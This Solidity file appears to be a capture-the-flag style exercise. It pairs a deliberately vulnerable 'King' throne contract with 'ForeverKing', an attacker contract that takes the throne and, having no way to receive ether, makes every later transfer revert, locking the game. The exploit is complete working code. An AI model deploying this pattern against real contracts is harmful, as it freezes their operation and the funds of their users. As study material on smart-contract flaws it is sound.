// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract ForeverKing {
    address payable public king;

    constructor(address _king) {
        king = payable(_king);
    }

    function usurpTheThrone() public payable {
        King instance = King(king);
        require(msg.value >= instance.prize());
        (bool ok, ) = king.call{value: msg.value}("");
        require(ok);
    }
}
